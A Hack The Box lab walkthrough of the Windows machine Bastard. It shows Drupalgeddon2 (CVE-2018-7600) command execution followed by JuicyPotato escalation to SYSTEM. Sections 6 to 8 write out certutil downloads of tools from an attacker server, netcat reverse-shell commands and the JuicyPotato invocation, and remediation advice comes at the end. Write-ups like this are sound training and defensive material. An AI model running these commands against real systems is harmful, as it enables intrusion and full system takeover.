---
tags: [HTB, Bastard, Windows, Drupal, Drupalgeddon2, CVE-2018-7600, IIS, SeImpersonate, JuicyPotato, Hard]
aliases: [Bastard]
platform: Windows
difficulty: Hard
status: Complete
---

# HTB: Bastard, Full Walkthrough

## The gist

Bastard exposes a small IIS surface, but the web application identifies itself as Drupal 7.54. The public CHANGELOG.txt version disclosure maps directly to CVE-2018-7600, Drupalgeddon2. A reviewed Exploit-DB Ruby proof of concept provided command execution as nt authority\iusr.

The foothold token had SeImpersonatePrivilege enabled. After confirming the Windows build and architecture, JuicyPotato was transferred with certutil.exe, a working COM class was selected by testing CLSIDs, and a second callback arrived as NT AUTHORITY\SYSTEM.

> [!important] Key finding
> Version fingerprinting turned an ordinary IIS page into a Drupal exploit path. The complete route was Drupal version disclosure → CVE-2018-7600 command execution → SeImpersonatePrivilege triage → JuicyPotato CLSID testing → SYSTEM callback.

## Box information

| Field | Value |
|---|---|
| Platform | Windows Server 2008 R2 Datacenter x64, build 7600 |
| Difficulty | Hard |
| TCP services | IIS 7.5 on 80, MSRPC on 135, an unknown service on 49154 |
| Web application | Drupal 7.54 |
| Initial access | Drupalgeddon2, CVE-2018-7600 |
| Foothold | Command execution as nt authority\iusr |
| Privilege escalation | SeImpersonatePrivilege with JuicyPotato |
| Alternative advertised path | CVE-2015-1701, not needed for the verified route |

## Evidence and loot

This write-up was reconstructed from the private Bastard workspace, Nmap output, the modified local Exploit-DB copy, transfer logs, and screenshots. The raw transcript and flag evidence remain in the private platform workspace. The vault contains no flag values, passwords, hashes, or other secret proof material.

Relevant private evidence includes nmap/tcp-all.*, nmap/services.*, exploits/44449.rb, the local HTTP transfer log, and the shell screenshots. The exploit source was reviewed and minimally adapted for the installed Ruby environment before execution.

## Variables

Load the helper variables first. $BoxIP should come from boxload or the box controller. Keep the local address, callback ports, and target-side temporary paths in private shell state.

~~~bash
boxload
boxset BoxName Bastard
boxset BoxDir "$HOME/Platforms/HackTheBox/Bastard"
boxset Wordlist /usr/share/wordlists/rockyou.txt
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
boxset WebPort 80
boxset Port 4444
boxset Port2 4445
boxset TransferPort 8001
boxset PotatoPort 1337
boxset ExploitFile "$BoxDir/exploits/44449.rb"
boxset PotatoFile "$BoxDir/www/JuicyPotato.exe"
boxset NcFile "$BoxDir/www/nc.exe"
boxset RemoteTmp 'C:\inetpub\drupal-7.54\sites\default\files\tmp'
boxset PotatoPath "$RemoteTmp\JuicyPotato.exe"
boxset NcPath "$RemoteTmp\nc.exe"
boxset CmdPath 'C:\Windows\System32\cmd.exe'
boxset CLSIDFail '{4991d34b-80a1-4291-83b6-3328366b9097}'
boxset CLSID '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
mkdir -p "$BoxDir/nmap" "$BoxDir/loot" "$BoxDir/exploits" "$BoxDir/www" "$BoxDir/screenshots"
~~~

## 1. Run the full TCP scan

The initial scan established the reachable TCP surface and provided the service list for targeted enumeration. Nmap identified only three useful TCP responses, so the web service became the first priority.

~~~bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 \
  --host-timeout 5m -T4 -oA "$BoxDir/nmap/tcp-all" "$BoxIP"
~~~

The scan found TCP 80, 135, and 49154. The host fingerprint was Windows, with HTTP as the only immediately useful application surface.

![[bastard-1-nmap-allports.png]]

SCREENSHOT: The full TCP scan identifies HTTP, MSRPC, and the high RPC port.

> [!tip] Efficiency
> Save the full scan before narrowing the service list. It prevents a later high port from being mistaken for an unrelated service.

## 2. Fingerprint IIS and enumerate the Drupal version

The service scan confirmed IIS 7.5 and exposed application-level clues through the HTTP scripts. The robots.txt output also referenced CHANGELOG.txt, which is a high-value version disclosure for Drupal.

~~~bash
boxset OpenPorts "80,135,49154"
sudo nmap -Pn -n -sC -sV --version-light -p "$OpenPorts" \
  -oA "$BoxDir/nmap/services" "$BoxIP"

curl -sS "http://$BoxIP/CHANGELOG.txt" | grep -m1 "Drupal"
curl -sS "http://$BoxIP/robots.txt" | sed -n '1,80p'
~~~

The page disclosed Drupal 7.54. That version is below the fixed Drupal 7.58 threshold for CVE-2018-7600, so the next step was to review the matching public exploit rather than brute-force the site.

![[bastard-2-nmap-services.png]]

SCREENSHOT: The targeted service scan confirms IIS 7.5 and the Drupal application.

![[bastard-3-changelog.png]]

SCREENSHOT: CHANGELOG.txt discloses Drupal 7.54.

## 3. Review and adapt the Drupalgeddon2 proof of concept

Exploit-DB entry 44449 is a Ruby implementation of Drupalgeddon2. The source was copied into the box workspace and reviewed before execution. The installed environment did not provide the optional HighLine dependency, and the run used direct operating-system command execution instead of writing a PHP webshell.

~~~bash
searchsploit "Drupal 7"
searchsploit -x php/webapps/44449.rb
cp /usr/share/exploitdb/exploits/php/webapps/44449.rb "$ExploitFile"

# Remove the optional dependency only when the local Ruby environment lacks it.
sed -i "/require 'highline\/import'/d" "$ExploitFile"

# Keep the PoC on its direct command-execution path.
sed -i 's/try_phpshell = true/try_phpshell = false/' "$ExploitFile"
ruby -c "$ExploitFile"
~~~

The important validation was that the target version, the exploit's Drupal form path, and the local Ruby dependencies all matched before sending commands to the target.

> [!warning] Gotcha
> A search result is not a drop-in exploit. Read the source, remove only the dependency that is actually missing, and preserve the original PoC under $BoxDir/exploits/ for reproducibility.

## 4. Obtain Drupal command execution

The adapted PoC was run against the site root. It fingerprinted Drupal 7.54, confirmed clean URLs, and verified code execution with a random echo value before opening its command prompt.

~~~bash
ruby "$ExploitFile" "http://$BoxIP/"
~~~

At the interactive prompt, start with identity and privilege checks. The first command returned nt authority\iusr, confirming a real Windows execution context rather than a false-positive HTTP response.

~~~text
drupalgeddon2>> whoami
nt authority\iusr

drupalgeddon2>> hostname
Bastard
~~~

![[bastard-4-drupalgeddon-and-whoami.png]]

SCREENSHOT: The adapted Drupalgeddon2 PoC verifies code execution and returns the IUSR identity.

## 5. Triage the Windows token

Privilege escalation decisions should follow the current token and the OS build. whoami /priv showed that SeImpersonatePrivilege was enabled, making a Potato-family token-abuse route more promising than immediately attempting the alternative kernel exploit.

~~~text
drupalgeddon2>> whoami /priv
~~~

The enabled privileges included SeChangeNotifyPrivilege, SeImpersonatePrivilege, and SeCreateGlobalPrivilege.

~~~text
drupalgeddon2>> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
Microsoft Windows Server 2008 R2 Datacenter
Version 6.1.7600 N/A Build 7600
x64-based PC
~~~

![[bastard-5-iusr.png]]

SCREENSHOT: The foothold token is nt authority\iusr and has SeImpersonatePrivilege enabled.

![[bastard-6-systeminfo.png]]

SCREENSHOT: systeminfo confirms Windows Server 2008 R2 build 7600 on x64.

The OS is old enough for JuicyPotato to be a reasonable candidate, but the tool still needs a compatible binary and a working CLSID. Treat both as hypotheses until tested.

## 6. Stage Netcat and receive a stable foothold shell

The Drupal command prompt is useful for proof commands, but a callback shell makes Windows enumeration easier. The local HTTP server served only the reviewed files from the Bastard workspace, and the target used certutil.exe to download nc.exe into Drupal's writable temporary directory.

~~~bash
cp /usr/share/windows-resources/binaries/nc.exe "$NcFile"
python3 -m http.server "$TransferPort" --directory "$BoxDir/www" \
  > "$BoxDir/loot/http-transfer.log" 2>&1 &
nc -lvnp "$Port"
~~~

From the Drupalgeddon2 command prompt, transfer Netcat and request a callback:

~~~text
certutil -urlcache -split -f http://$LocalIP:$TransferPort/nc.exe $NcPath
$NcPath $LocalIP $Port -e cmd.exe
~~~

The callback arrived as nt authority\iusr. The low-privilege shell was enough to confirm the working directory, host name, and target-side temporary path used for the escalation tools.

![[bastard-7-nc-transfer.png]]

SCREENSHOT: The target retrieves the reviewed Netcat binary from the controlled local HTTP server.

![[bastard-8-foothold-shell.png]]

SCREENSHOT: The reverse shell provides a repeatable Windows command prompt as IUSR.

![[bastard-9-proof.png]]

SCREENSHOT: The callback shell confirms the low-privilege identity and host name.

## 7. Transfer and test JuicyPotato CLSIDs

JuicyPotato abuses a COM authentication flow to obtain a SYSTEM token and create a process with it. The first CLSID returned a socket error, so it was not reused. A second candidate returned authresult 0, which was the evidence needed to proceed.

Transfer the reviewed binary into the same target-side temporary directory:

~~~text
certutil -urlcache -split -f http://$LocalIP:$TransferPort/JuicyPotato.exe $PotatoPath
dir $RemoteTmp\*.exe
~~~

Test the initial candidate, then test the working candidate:

~~~text
$PotatoPath -l $PotatoPort -p $CmdPath -t * -c $CLSIDFail
$PotatoPath -l $PotatoPort -p $CmdPath -t * -c $CLSID
~~~

The failed candidate returned COM -> recv failed with error: 10038. The working candidate returned authresult 0 and CreateProcessWithTokenW OK, confirming that the selected COM class could produce the privileged process on this build.

![[bastard-10-juicy-transfer.png]]

SCREENSHOT: certutil downloads JuicyPotato and the target-side directory listing confirms both staged executables.

> [!warning] Gotcha
> The JuicyPotato -l port is a target-side COM listener. It is not the Kali callback port. Keep $PotatoPort, $Port, and $Port2 separate.

## 8. Use the verified CLSID for a SYSTEM callback

The final command used cmd.exe as the JuicyPotato-created process and passed a separate Netcat callback as its argument. The -a value is quoted because it contains the complete command line that SYSTEM should execute.

~~~bash
nc -lvnp "$Port2"
~~~

~~~text
$PotatoPath -l $PotatoPort -p $CmdPath \
  -a "/c $NcPath $LocalIP $Port2 -e cmd.exe" \
  -t * -c $CLSID
~~~

The second callback arrived as NT AUTHORITY\SYSTEM. That identity proof established the root-equivalent result for the Windows box without placing any flag contents in the shared notes.

![[bastard-11-system-shell.png]]

SCREENSHOT: The callback created through the tested JuicyPotato CLSID runs as NT AUTHORITY\SYSTEM.

## 9. Clean down the target and local workspace

Remove any temporary Drupal exploit artifacts, both transferred binaries, and any temporary output created during the run. Use the exact paths recorded in the session and verify that the files are gone before closing the listeners.

~~~text
del /F /Q $PotatoPath
del /F /Q $NcPath
dir $RemoteTmp\*.exe
~~~

~~~bash
pkill -f "python3 -m http.server $TransferPort" 2>/dev/null || true
~~~

The final cleanup should also remove any temporary proof files created by the command shell. Do not delete unrelated Drupal files or use a recursive deletion against the application directory.

## Troubleshooting map

| Symptom | Likely cause | Next check |
|---|---|---|
| Only IIS and RPC ports appear | The initial scan is incomplete or the target is resetting | Re-run the full TCP scan and save both Nmap output sets |
| CHANGELOG.txt is missing | The site path or virtual host is wrong | Read the root page, robots.txt, and the Nmap HTTP script output |
| Ruby PoC stops on highline/import | Optional local gem is not installed | Review the source and remove only that unused require |
| Drupalgeddon2 finds the version but does not execute | Wrong base URL, clean URL assumption, or unmodified PoC path | Run the PoC against the site root and keep its direct command mode |
| Callback does not arrive | Listener, local address, transfer port, or target command is wrong | Prove whoami first, check the HTTP transfer log, and separate $Port from $Port2 |
| First CLSID fails with socket error | The COM class is incompatible on this build | Test another documented CLSID with JuicyPotato before changing the payload |
| JuicyPotato returns no SYSTEM callback | Wrong architecture, listener collision, or malformed -a | Re-check systeminfo, use a free $PotatoPort, and quote the callback command |

## Tools used

| Tool | Role |
|---|---|
| Nmap | Full TCP and service enumeration |
| curl | Drupal version and robots.txt checks |
| SearchSploit / Exploit-DB | Locate and review Drupalgeddon2 entry 44449 |
| Ruby | Run the adapted Drupalgeddon2 proof of concept |
| Python HTTP server | Serve reviewed Windows binaries from the temporary workspace |
| certutil.exe | Transfer Netcat and JuicyPotato to the target |
| Netcat | Receive the IUSR and SYSTEM callbacks |
| JuicyPotato | Abuse SeImpersonatePrivilege through a tested COM class |

## Remediation notes

- Upgrade Drupal to a supported release and remove public version disclosures such as CHANGELOG.txt from production web roots.
- Apply the Drupalgeddon2 fix for CVE-2018-7600 and review all custom form handlers for unsafe render-array processing.
- Run IIS worker processes with the least privilege necessary and remove SeImpersonatePrivilege where the service does not require it.
- Restrict outbound connections from service identities and monitor certutil downloads from web-worker processes.
- Keep Windows Server 2008 R2 out of production and replace unsupported operating systems with fully patched versions.

## RUNBOOK V2 Stages Used

1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the workspace and save the full TCP scan.
2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: prioritise the exposed HTTP service and retain the full high-port result.
3. [[OSCP/RUNBOOK V2/Windows - Service Scan|Windows - Service Scan]]: identify IIS 7.5, MSRPC, and the high RPC port.
4. [[OSCP/RUNBOOK V2/Windows - Web Enum|Windows - Web Enum]]: inspect robots.txt, CHANGELOG.txt, and the application generator.
5. [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]]: map Drupal 7.54 to CVE-2018-7600 and review EDB 44449.
6. [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]]: copy, inspect, minimally adapt, and syntax-check the Ruby PoC.
7. [[OSCP/RUNBOOK V2/Windows - Shell Received|Windows - Shell Received]]: verify identity, host name, and the returned Windows command context.
8. [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows - Privilege Triage]]: confirm SeImpersonatePrivilege and the target architecture.
9. [[OSCP/RUNBOOK V2/Windows - SeImpersonate Abuse|Windows - SeImpersonate Abuse]]: test CLSIDs and use the verified JuicyPotato route.
10. [[OSCP/RUNBOOK V2/Windows - Clean Down|Windows - Clean Down]]: remove target-side binaries and stop the local transfer server.

## Attack Chain

1. Full TCP enumeration identified IIS 7.5 on port 80.
2. robots.txt and CHANGELOG.txt disclosed Drupal 7.54.
3. Drupal 7.54 matched the vulnerable range for CVE-2018-7600.
4. Reviewed Exploit-DB entry 44449 provided command execution as nt authority\iusr.
5. Token triage showed enabled SeImpersonatePrivilege.
6. systeminfo confirmed Windows Server 2008 R2 build 7600 on x64.
7. Netcat and JuicyPotato were transferred through a controlled local HTTP server and certutil.exe.
8. The first JuicyPotato CLSID failed; a second candidate returned a successful COM authentication result.
9. The verified CLSID created a SYSTEM callback.

## Credentials

| Account or material | Source | Use |
|---|---|---|
| nt authority\iusr | Drupalgeddon2 whoami output | Initial command execution and callback context |
| SeImpersonatePrivilege | whoami /priv output | Token-abuse route to SYSTEM |

## Flags

User flag: collected privately from the target; value intentionally omitted.

Root flag: collected privately after the SYSTEM callback; value intentionally omitted.

## Key lessons

- A version disclosure is often more useful than broad directory brute force when it maps directly to a known CMS exploit.
- The exploit source and local dependencies must be reviewed before execution. A small environment fix is safer than replacing the PoC with an unreviewed payload.
- Prove code execution with whoami before moving to a callback shell.
- SeImpersonatePrivilege should be checked immediately after a Windows service-account foothold.
- JuicyPotato CLSIDs are build-dependent. Test a candidate and record the failure mode before trying the next one.
- Keep the target-side COM listener port separate from the Kali callback port.
- Use systeminfo to confirm architecture before transferring a Windows binary.
- Cleanup is part of the assessment: remove staged tools, proof files, and local listeners.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]]: anonymous FTP-to-IIS ASP execution followed by x86 JuicyPotato.
- [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]]: Windows web foothold, SeImpersonatePrivilege, and a verified JuicyPotato path.
- [[OSCP/BOXES/WRITE UPS/Windows/Netmon|Netmon]]: Windows web exposure followed by a service-level escalation.
- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]]: web application versioning, public exploit review, and Windows post-exploitation.

## External Resources

- [Drupal security advisory SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
- [Drupalgeddon2 public research](https://github.com/dreadlocked/Drupalgeddon2)
- [Exploit-DB 44449](https://www.exploit-db.com/exploits/44449)
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
- [Microsoft certutil documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

## Why this matters for OSCP

Bastard is a compact lesson in turning application fingerprinting into a verified exploit, then using the returned Windows token to choose a local escalation path. The transferable workflow is: identify the exact version, review the PoC, prove command execution, triage the token, test the escalation primitive, and clean up every artifact.

## Checklist

- [x] Full TCP and service scans saved under $BoxDir/nmap/
- [x] IIS and Drupal 7.54 fingerprint recorded
- [x] Drupalgeddon2 source copied, reviewed, adapted, and syntax-checked
- [x] Command execution proved as nt authority\iusr
- [x] whoami /priv and systeminfo captured
- [x] Netcat callback received and documented
- [x] JuicyPotato transferred through certutil.exe
- [x] CLSID failure and working CLSID recorded without secret material
- [x] SYSTEM callback received without exposing flags
- [x] Target-side binaries and local transfer server cleaned up
- [x] Runbook, command master, Seen in links, and master box list updated
